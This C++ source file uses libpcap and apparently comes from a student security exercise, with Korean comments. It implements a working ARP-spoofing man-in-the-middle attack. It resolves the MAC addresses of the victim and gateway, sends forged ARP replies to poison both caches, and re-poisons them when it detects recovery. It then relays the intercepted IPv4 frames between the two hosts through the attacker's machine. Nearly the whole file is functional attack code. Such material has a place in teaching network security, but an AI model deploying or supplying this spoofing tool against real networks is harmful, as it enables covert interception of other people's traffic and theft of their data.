    #include "arp.h"
    #include "mac_addr.h"
    #define RECVPKT_TIMEOUT_MS 200 
    total_Arp Arp_Request(uint32_t sendip , uint32_t reip,char* name){
        total_Arp packet;
        makeuint8_tmac(packet.eth_he.sou,name);
        for(int i=0;i<6;i++)
            packet.eth_he.des[i] = 0xFF;
        packet.eth_he.type = htons(0x0806);
        packet.arp_he.hw_type = htons(0x0001);
        packet.arp_he.pro_type = htons(0x0800); 
        packet.arp_he.hw_len = 6;                     
        packet.arp_he.pro_len = 4;                    
        packet.arp_he.opcode = htons(0x0001);    //0x0001는 ARP 요청 패킷
        
        memcpy(packet.arp_he.sip, &sendip, 4);
        makeuint8_tmac(packet.arp_he.smac,name);

        for(int i=0;i<6;i++)
            packet.arp_he.tmac[i] = 0x00;
        memcpy(packet.arp_he.tip, &reip, 4);
        return packet;
    }

    void makeuint8_tmac(uint8_t* recv_mac, char* name){
        uint8_t* temp = make_my_mac(name);
        for(int i=0; i<6;i++)
            recv_mac[i] = temp[i];
    }

    //main에 있는 주석처럼 mac 주소를 받아오는 것을 구현해보려고 했는데 실패해서 GPT를 이용하여서 구현하였습니다.
    //그래서 제가 이해하는 느낌으로 주석을 추가하겠습니다.
    uint8_t* get_target_mac_by_arp(pcap_t* pcap,uint32_t sender_ip ,uint32_t target_ip, total_Arp packet) {
        if (pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&packet), sizeof(total_Arp)) != 0) {
            fprintf(stderr, "[!] ARP 요청 전송 실패: %s\n", pcap_geterr(pcap));
            return nullptr;
        }
        //pcap_sendpacket을 이용해 패킷을 보냅니다. 그 후 예외처리를 설정합니다.

        struct pcap_pkthdr* header;  //캡처된 패킷의 헤더 정보를 얻기 위해서 사용합니다. 시간 정보가 예시입니다. 
        const u_char* pkt;          //패킷 안에 어떤 데이터가 들어오는지 확인할 수 있도록 구조체를 설정해줍니다.
        int res;

        time_t start = time(nullptr); 
        while (true) {
            res = pcap_next_ex(pcap, &header, &pkt); //그 다음 패킷을 잡아보고 
            if (res == 0) continue; // timeout       //// res == 0: 패킷이 없어 타임 아웃이 나면 다음 루프로 계속 대기합니다.
            if (res == -1 || res == -2) break;      //-1, -2면 오류 대기이거나 루프 중단 요청이 나온 것 입니다.

            // Ethernet Type 검사
            if (ntohs(*(uint16_t*)(pkt + 12)) != 0x0806) continue; // ARP 패킷이 아니니까 다시 패킷을 받아온다.

            const u_char* arp_ptr = pkt + 14; //만약 arp 패키지면 pkt사이즈에 14를 추가하여 Ethernet 헤더를 건너뛰고 ARP 헤더 시작 지점으로 이동
            uint16_t opcode = ntohs(*(uint16_t*)(arp_ptr + 6)); //opcode도 확인하여 2중으로 확인합니다.
            if (opcode != 0x0002) continue; // ARP Reply 아님 → 내가 보낸 요청의 응답인지 확인하기 위해서 ARP Reply만 처리

            uint32_t arp_sender_ip;
            uint32_t arp_target_ip;
            memcpy(&arp_sender_ip, arp_ptr + 14, 4); // ARP Sender IP를 꺼내오기
            memcpy(&arp_target_ip, arp_ptr + 24, 4); // ARP Target IP를 꺼내오기

            // 내가 보낸 요청의 응답인지 확인
            // arp_sender_ip는 target_ip와 같아야 하고, arp_target_ip는 sender_ip와 같아야 한다.
            if (arp_sender_ip != target_ip || arp_target_ip != sender_ip) { 
                if (time(nullptr) - start > 5) break; // 5초 동안 조건에 맞는 응답이 없으면 종료
                continue; 
            }

            // sender MAC 저장
            static uint8_t target_mac[6]; // 위의 조건들을 다 통과하면 내가 보낸 패킷이 맞으니까 target_mac으로 설정하여서 저장한다.
            memcpy(target_mac, arp_ptr + 8, 6); // 그리고 memcpy로 내가 설정한 return을 할 수 있는 값으로 설정.
            return target_mac; //그리고 내가 보낸 패킷으로 얻은 mac 값을 return 할 수 있도록 설정하였다.
        }

        fprintf(stderr, "[!] ARP Reply를 받지 못했습니다.\n");
        return nullptr;
    }

    total_Arp Arp_Reply(uint32_t sender_ip ,uint8_t* s_mac, uint32_t target_ip, char* name ){
        total_Arp packet;
        makeuint8_tmac(packet.eth_he.sou,name);     // Ethernet Source MAC은 나의 MAC
        for(int i=0;i<6;i++)
            packet.eth_he.des[i] = s_mac[i];        // Ethernet Destination MAC은 상대 MAC

        packet.eth_he.type = htons(0x0806);         //0x0806은 arp 패킷의 타입.
        packet.arp_he.hw_type = htons(0x0001);      //0x0001은 하드웨어 타입
        packet.arp_he.pro_type = htons(0x0800); 
        packet.arp_he.hw_len = 6;                     
        packet.arp_he.pro_len = 4;                    
        packet.arp_he.opcode = htons(0x0002);       //0x0002는 ARP 응답 요청

        memcpy(packet.arp_he.sip, &target_ip, 4);    // 응답의 Sender IP는 'targetip'(= target IP)로 설정
        makeuint8_tmac(packet.arp_he.smac, name);   // 응답의 Sender MAC은 나의 MAC

        for(int i=0;i<6;i++)
            packet.arp_he.tmac[i] = s_mac[i];       // 응답의 Target MAC은 '상대 MAC'
        memcpy(packet.arp_he.tip, &sender_ip, 4);      // 응답의 Target IP는 'sendip'(= sender IP)

        return packet; 
    }

    void infect(ip_collection * collete, pcap_t * pcap, int cnt, char *name){
        for(int i=0;i<cnt;i++){
            total_Arp packet = Arp_Reply(collete[i].sendip, collete[i].sendmac, collete[i].targetip, name);
            if (pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&packet), sizeof(packet)) != 0)
                fprintf(stderr, "poison sender 실패: %s\n", pcap_geterr(pcap));
            total_Arp packet2 = Arp_Reply(collete[i].targetip, collete[i].targetmac, collete[i].sendip, name);
            if (pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&packet2), sizeof(packet2)) != 0)
                fprintf(stderr, "poison target 실패: %s\n", pcap_geterr(pcap));
        }
    }

    void makecollet(ip_collection* collete, pcap_t* pcap, int cnt, char** argv, char *name){
        total_Arp packet1;
        total_Arp packet2;
        uint8_t* know_mac1;
        uint8_t* know_mac2;
        uint8_t* my_mac = make_my_mac(name);
        for(int i=0;i< (cnt-2)/2;i++){
            // 문자열을 바이너리 IP(uint32_t, 네트워크 바이트 오더)로 변환
            inet_pton(AF_INET, argv[2 + i*2], &collete[i].sendip);
            inet_pton(AF_INET, argv[3 + i*2], &collete[i].targetip);

            packet1 = Arp_Request(collete[i].sendip, collete[i].targetip, name);
            know_mac1 = get_target_mac_by_arp(pcap, collete[i].sendip,collete[i].targetip ,packet1);
            memcpy(collete[i].targetmac, know_mac1, 6);

            packet2 = Arp_Request(collete[i].targetip, collete[i].sendip, name);
            know_mac2 = get_target_mac_by_arp(pcap, collete[i].targetip, collete[i].sendip, packet2);
            memcpy(collete[i].sendmac, know_mac2, 6);

            memcpy(collete[i].mymac, my_mac, 6); 
        }
    }

    //arp spoof의 중심 함수: sender가 target으로 보내는 IP 패킷을 내가 대신 받아서 target으로 보내주는 역할
    //collect에는 (sender IP, target IP, sender MAC, target MAC)이 들어있다고 가정한다.
    //pair_cnt: 몇 쌍(sender,target)을 사용할지
size_t receiveandsend(pcap_t* pcap, ip_collection* collect, int pair_cnt, char *name){
    struct pcap_pkthdr* header = NULL;
    const u_char* pkt = NULL;
    size_t processed = 0;

    struct timespec t0, t1;
    clock_gettime(CLOCK_MONOTONIC, &t0);
    while (1) {
        // 200ms 동작 후 반환
        clock_gettime(CLOCK_MONOTONIC, &t1);
        long elapsed_ms = (t1.tv_sec - t0.tv_sec) * 1000L + (t1.tv_nsec - t0.tv_nsec) / 1000000L;
        if (elapsed_ms >= RECVPKT_TIMEOUT_MS) break;

        int res = pcap_next_ex(pcap, &header, &pkt);
        if (res == 0) continue;
        if (res == -1 || res == -2) break;

        // 이더넷 헤더
        const uint8_t* eth = pkt;
        uint16_t etype = ntohs(*(uint16_t*)(pkt + 12));
        // ARP: 복구 징후 시 재감염 트리거
        if (etype == 0x0806) {
            const u_char* arp_ptr = pkt + 14;
            uint8_t arp_send_mac[6];
            uint32_t arp_send_ip, arp_target_ip;
            memcpy(arp_send_mac, arp_ptr + 8, 6);
            memcpy(&arp_send_ip, arp_ptr + 14, 4);
            memcpy(&arp_target_ip, arp_ptr + 24, 4);

            for (int i=0; i<pair_cnt; i++) {
                if ((arp_send_ip == collect[i].sendip && arp_target_ip == collect[i].targetip) ||
                    (arp_send_ip == collect[i].targetip && arp_target_ip == collect[i].sendip)) {
                    if (memcmp(arp_send_mac, collect[i].mymac, 6) != 0) {
                        infect(collect, pcap, pair_cnt, name);
                    }
                    break;
                }
            }
            continue; // ARP는 릴레이하지 않음
        }
        // IPv4만 릴레이
        if (etype != 0x0800) continue;

        const u_char* ip_ptr = pkt + 14;
        // 목적지 MAC이 내 MAC인 프레임만 처리, 내가 보낸 건 제외
        if (memcmp(eth + 0, collect[0].mymac, 6) != 0) continue;
        if (memcmp(eth + 6, collect[0].mymac, 6) == 0) continue;

        uint32_t ip_src, ip_dst;
        memcpy(&ip_src, ip_ptr + 12, 4);
        memcpy(&ip_dst, ip_ptr + 16, 4);

        const uint8_t* src_mac = eth + 6; // 이더넷 Source MAC

        //frame 변수를 선언할 때 자꾸 오류가 나길래 AI를 활용하여서 선언하였습니다.
        for (int i = 0; i < pair_cnt; i++) {
            // sender -> target
            if (memcmp(src_mac, collect[i].sendmac, 6) == 0) {
                u_char* frame = (u_char*)malloc(header->caplen);
                if (!frame) break;
                memcpy(frame, pkt, header->caplen);
                memcpy(frame + 0, collect[i].targetmac, 6); // DST = 타겟(게이트웨이) MAC
                memcpy(frame + 6, collect[i].mymac, 6);     // SRC = 내 MAC
                pcap_sendpacket(pcap, frame, header->caplen);
                free(frame);
                break;
            }
            // target -> sender
            if (memcmp(src_mac, collect[i].targetmac, 6) == 0) {
                u_char* frame = (u_char*)malloc(header->caplen);
                if (!frame) break;
                memcpy(frame, pkt, header->caplen);
                memcpy(frame + 0, collect[i].sendmac, 6);   // DST = 송신자(피해자) MAC
                memcpy(frame + 6, collect[i].mymac, 6);     // SRC = 내 MAC
                pcap_sendpacket(pcap, frame, header->caplen);
                free(frame);
                break;
            }
        }
    }
    return processed;
}
